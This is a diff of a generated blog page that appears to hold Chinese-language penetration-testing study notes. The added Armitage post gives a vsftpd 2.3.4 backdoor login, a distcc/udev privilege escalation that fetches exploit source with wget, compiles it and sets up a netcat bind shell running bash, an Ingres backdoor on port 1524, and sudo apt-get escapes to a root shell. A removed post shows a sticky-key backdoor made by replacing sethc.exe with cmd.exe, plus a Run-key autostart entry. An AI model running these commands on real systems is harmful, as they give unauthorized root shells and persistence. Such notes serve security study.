@@ -64,6 +64,80 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-armitage和漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2021-08-06T04:26:36.000Z" itemprop="datePublished">2021-08-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">armitage和漏洞复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p>DLL动态链接库</p>
+<p><code>DLL劫持指的是，病毒通过一些手段来劫持或者替换正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。</code></p>
+<p>监控工具: Monitorprocess、火绒剑…</p>
+<p>.\dll注入检测脚本.ps1 xxxx.exe</p>
+<h2 id="armitage"><a href="#armitage" class="headerlink" title="armitage"></a>armitage</h2><p>armitage: 图形化的MSF,完全依赖MSF. 火了之后开发了商业版: cobalt strike –&gt; 这款工具跟msf, empire称为内网三剑客.</p>
+<p>armitage安装: <code>apt-get install armitage</code></p>
+<p>运行: <code>armitage</code></p>
+<p>console: 控制台</p>
+<p>attacks: 探测目标主机是否有漏洞存在</p>
+<pre><code>1. find attacks    快速探测
+2. hail mary        全部漏洞探测</code></pre>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>netdiscover:     探测内网主机存活</p>
+<p>80: http</p>
+<p><strong>永恒之蓝: ms17-010 exp: search ms17-010</strong></p>
+<p>漏洞发现 –&gt; 验证 –&gt; 公布 –&gt; poc –&gt; exp</p>
+<p><strong>vsftpd 2.3.4:</strong> </p>
+<p>手工利用:</p>
+<p>ftp IP</p>
+<p>– Connected to 192.168.37.195. – 220 (vsFTPd 2.3.4) – Name (192.168.37.195:root): root:) –                 password: root<br>                            § 如果有卡住不显示任何东西<br>                            § nc IP 6200 连入</p>
+<p><strong>msf: search vsftpd</strong></p>
+<p><strong>distcc + udev提权</strong></p>
+<p>​    distcc exp:search distcc</p>
+<p>​    cd /tmp</p>
+<p>​    wget <a target="_blank" rel="noopener" href="http://192.168.1.135/8572.c">http://192.168.1.135/8572.c</a> -O udev.c</p>
+<p>​    gcc udev.c -o udev</p>
+<p>​    cat /proc/net/netlink</p>
+<p>​    echo ‘#!/bin/bash’ &gt; run</p>
+<p>​    echo ‘/bin/netcat -lvvp 4445 -e /bin/bash’ &gt;&gt; run</p>
+<p>​    ./udev 2792</p>
+<p>​    查看端口开放情况: lsof -i:4445 </p>
+<p>​    开放了就可以连接了</p>
+<p>​    <strong>Ingres数据库DBMS后门</strong></p>
+<p>​    namp扫描: 开放了1524端口,尝试用telnet ip 1524 连接,如果存在后门,直接获取root权限的shell</p>
+<p>sudo -l : <code>查看用户权限,如果有特殊指令存在以root权限运行的话或者不需要密码的话可以拿来提权</code></p>
+<p>apt-get 提权: </p>
+<p>前提: 可以不需要密码,或者默认以root权限运行</p>
+<p>1.<strong>sudo apt-get update -o APT::UPDATE::Pre-invoke::=”/bin/bash -i”</strong></p>
+<p>2.<strong>sudo  apt-get changelog apt –&gt; !/bin/bash</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="ckw24ym2c000bi4vj0h70c5tm" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-linux后门植入" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" class="article-date">
@@ -125,7 +199,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="ckvuhge0x000gggvjcxwp7izf" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="ckw24ym2h000gi4vjgimh1569" class="article-share-link">Share</a>
       
       
     </footer>
@@ -193,7 +267,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="ckvuhge0x000hggvjel8xbjar" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="ckw24ym2j000ji4vjacxg050d" class="article-share-link">Share</a>
       
       
     </footer>
@@ -264,7 +338,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckvuhge11000oggvjf30n8hoy" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckw24ym2m000oi4vjbgkdfswp" class="article-share-link">Share</a>
       
       
     </footer>
@@ -350,7 +424,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="ckvuhge12000pggvj2hxq8m9r" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="ckw24ym2l000ni4vj5i805xlm" class="article-share-link">Share</a>
       
       
     </footer>
@@ -409,7 +483,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="ckvuhge0y000iggvj5a7z17wh" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="ckw24ym2i000hi4vjg0ns5hzf" class="article-share-link">Share</a>
       
       
     </footer>
@@ -527,7 +601,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/20/MSF-meterpreter/" data-id="ckvuhge0n0002ggvjgekt31ik" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/20/MSF-meterpreter/" data-id="ckw24ym250002i4vj6omp8zl3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -587,7 +661,7 @@ shellcode: 机器码(二进制,十六进制)
 <ol>
 <li><p>db_connect -y /usr/share/metasploit-framework/config/database.yml</p>
 </li>
-<li><p>db_connect user:<a href="mailto:&#x70;&#x61;&#x73;&#115;&#119;&#111;&#x72;&#x64;&#x40;&#49;&#x32;&#x37;&#x2e;&#48;&#46;&#x30;&#x2e;&#49;">&#x70;&#x61;&#x73;&#115;&#119;&#111;&#x72;&#x64;&#x40;&#49;&#x32;&#x37;&#x2e;&#48;&#46;&#x30;&#x2e;&#49;</a>/database_name</p>
+<li><p>db_connect user:<a href="mailto:&#x70;&#x61;&#115;&#115;&#119;&#111;&#114;&#x64;&#64;&#x31;&#x32;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;">&#x70;&#x61;&#115;&#115;&#119;&#111;&#114;&#x64;&#64;&#x31;&#x32;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;</a>/database_name</p>
 </li>
 </ol>
 <h5 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令:"></a>基础指令:</h5><h5 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole:"></a>msfconsole:</h5><p>msf是用ruby语言写的,脚本后缀为.rc文件</p>
@@ -637,7 +711,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckvuhge0n0003ggvjgfn443oq" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckw24ym250003i4vj8we2aztj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -695,7 +769,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="ckvuhge0r0008ggvjdur42jdg" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="ckw24ym2a0008i4vjbhr520nr" class="article-share-link">Share</a>
       
       
     </footer>
@@ -805,59 +879,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckvuhge18000tggvj41q4do42" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-注册表自启动和粘滞键后门" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" class="article-date">
-  <time datetime="2021-07-12T03:13:16.000Z" itemprop="datePublished">2021-07-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/">注册表自启动和粘滞键后门</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="注册表："><a href="#注册表：" class="headerlink" title="注册表："></a>注册表：</h4><p>​    数据类型：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REG_SZ：字符串：文本字符串</span><br><span class="line">REG_MULTI_SZ：多字符串值：含有多个文本值的字符串</span><br><span class="line">REG_BINARY：二进制数：二进制值，以十六进制显示，</span><br><span class="line">REG_DWORD：双字值；一个32位的二进制值，显示为8位的十六进制值</span><br></pre></td></tr></table></figure>
-
-<p>​    创建注册表：   regedit</p>
-<p>自启动路径：</p>
-<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RUN</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run &#x2F;v hh &#x2F;d &quot;calc.exe&quot; &#x2F;f</span><br><span class="line">reg add keyname ... 创建注册表</span><br><span class="line">&#x2F;v 注册表取名</span><br><span class="line">&#x2F;d 要执行的命令或者程序</span><br><span class="line">&#x2F;f 强制覆盖</span><br><span class="line"></span><br><span class="line">用户克隆</span><br><span class="line">注册表中sam文件下的administrator账户对应的目录文件中的F值覆盖掉普通用户对应目录的F值，权限会被继承</span><br></pre></td></tr></table></figure>
-
-<p>自启动文件夹：win + R –&gt; shell:startup</p>
-<p>​    C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
-<p>服务配置：win + R –&gt;msconfig</p>
-<p>UAC：user account control（用户账户控制）</p>
-<p>​        最底下：默认以管理员权限运行</p>
-<h4 id="粘滞键后门："><a href="#粘滞键后门：" class="headerlink" title="粘滞键后门："></a>粘滞键后门：</h4><p>​    原理：通过覆盖sethc.exe文件运行cmd</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. takeown &#x2F;F c:\windwos\system32\* &#x2F;A &#x2F;R</span><br><span class="line"></span><br><span class="line">2.cacls c:\windwos\system32\\* &#x2F;T &#x2F;E &#x2F;G administrators:F</span><br><span class="line"></span><br><span class="line">3.copy cmd.exe sethc.exe</span><br><span class="line"></span><br><span class="line">4.连续按5次shift键呼出cmd</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckvuhge1h0015ggvjfaxbdc4q" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckw24ym2o000si4vj803ccy3g" class="article-share-link">Share</a>
       
       
     </footer>
@@ -903,6 +925,10 @@ shellcode: 机器码(二进制,十六进制)
       <ul>
         
           <li>
+            <a href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/">逻辑越权漏洞—-各种越权和数据篡改</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/">文件操作之文件下载读取</a>
           </li>
         
@@ -916,10 +942,6 @@ shellcode: 机器码(二进制,十六进制)
         
           <li>
             <a href="/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">xss漏洞-过滤绕过及工具使用</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/">xss漏洞-基础分类及利用</a>
           </li>
         
       </ul>
